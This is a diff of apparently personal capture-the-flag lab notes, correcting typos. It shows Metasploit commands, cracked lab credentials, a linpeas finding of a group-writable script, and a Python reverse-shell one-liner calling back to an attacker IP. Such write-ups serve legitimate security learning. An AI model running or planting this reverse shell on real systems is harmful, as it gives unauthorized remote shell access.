@@ -45,7 +45,7 @@ sciana:07011972
 >set RHOSTS 10.10.27.229
 >run
 
-user:seinsa
+user:seina
 passwd:scoobydoo2
 
 
@@ -83,7 +83,7 @@ A.J Stone
 
 
 
-+] Interesting GROUP writable files (not in Home) (max 500)
+[+] Interesting GROUP writable files (not in Home) (max 500)
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
   Group users:
 /opt/cube/cube.sh
@@ -98,7 +98,7 @@ A.J Stone
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.26.235",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 
-*took me forever tp figure out but make sure to remeber quotation marks around your ip
+*took me forever to figure out but make sure to remeber quotation marks around your ip
 
 
 
